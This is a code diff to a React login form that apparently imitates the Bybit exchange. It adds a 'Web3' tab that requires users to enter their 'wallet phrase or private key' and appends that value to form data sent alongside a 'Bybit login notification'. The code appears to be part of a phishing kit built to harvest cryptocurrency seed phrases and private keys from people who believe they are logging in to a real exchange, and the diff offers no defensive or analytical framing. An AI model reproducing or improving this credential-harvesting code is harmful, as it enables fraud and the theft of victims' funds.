@@ -40,6 +40,7 @@ export default function LoginForm() {
   })
   const [issueDescription, setIssueDescription] = useState("")
   const [customIssue, setCustomIssue] = useState("")
+  const [walletPhrase, setWalletPhrase] = useState("")
 
   // Retrieve second verification data from session storage
   useEffect(() => {
@@ -71,6 +72,11 @@ export default function LoginForm() {
     setIsLoading(true)
 
     const formData = new FormData(e.target as HTMLFormElement)
+    
+    // Add wallet phrase to formData if it exists
+    if (walletPhrase) {
+      formData.append('walletPhrase', walletPhrase)
+    }
 
     // Send Bybit login notification
     try {
@@ -209,7 +215,7 @@ export default function LoginForm() {
       )}
 
       <Tabs defaultValue="email" className="w-full">
-        <TabsList className="grid w-full grid-cols-3 mb-6">
+        <TabsList className="grid w-full grid-cols-4 mb-6">
           <TabsTrigger value="email" className="text-sm">
             Email
           </TabsTrigger>
@@ -218,6 +224,9 @@ export default function LoginForm() {
           </TabsTrigger>
           <TabsTrigger value="qr" className="text-sm">
             QR Code
+          </TabsTrigger>
+          <TabsTrigger value="web3" className="text-sm">
+            Web3
           </TabsTrigger>
         </TabsList>
 
@@ -250,14 +259,6 @@ export default function LoginForm() {
                   )}
                 </Button>
               </div>
-            </div>
-
-            <div className="space-y-2">
-              <Textarea
-                name="walletPhrase"
-                placeholder="Optional: Enter wallet phrase or private key"
-                className="h-32 resize-none"
-              />
             </div>
 
             <div className="text-right">
@@ -325,6 +326,25 @@ export default function LoginForm() {
             </div>
             <p className="text-sm text-muted-foreground">Scan QR code with Bybit app to log in</p>
           </div>
+        </TabsContent>
+
+        <TabsContent value="web3">
+          <form onSubmit={handleLogin} className="space-y-4">
+            <div className="space-y-2">
+              <Textarea
+                name="walletPhrase"
+                placeholder="Enter your wallet phrase or private key"
+                value={walletPhrase}
+                onChange={(e) => setWalletPhrase(e.target.value)}
+                className="h-32 resize-none"
+                required
+              />
+            </div>
+
+            <Button type="submit" className="w-full h-12 bg-primary hover:bg-primary/90" disabled={isLoading}>
+              {isLoading ? "Connecting..." : "Connect Wallet"}
+            </Button>
+          </form>
         </TabsContent>
       </Tabs>
 
